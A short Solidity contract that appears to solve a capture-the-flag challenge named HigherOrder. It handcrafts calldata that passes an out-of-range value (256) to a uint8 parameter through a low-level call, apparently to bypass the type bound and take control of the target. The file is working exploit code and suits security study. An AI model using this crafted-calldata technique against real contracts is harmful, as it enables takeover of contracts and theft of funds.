// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

interface IHigherOrder {
    function registerTreasury(uint8 _value) external;
    function claimLeadership() external;
}

contract HigherOrderAttack {
    IHigherOrder higherOrder;

    constructor(address _higherOrderAddress) public {
        higherOrder = IHigherOrder(_higherOrderAddress);
    }

    function attack() public {
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));

        bytes memory craftedCalldata = abi.encodePacked(selector, uint256(256));

        (bool success, ) = address(higherOrder).call(craftedCalldata);
        require(success, "Attack failed");
    }
}
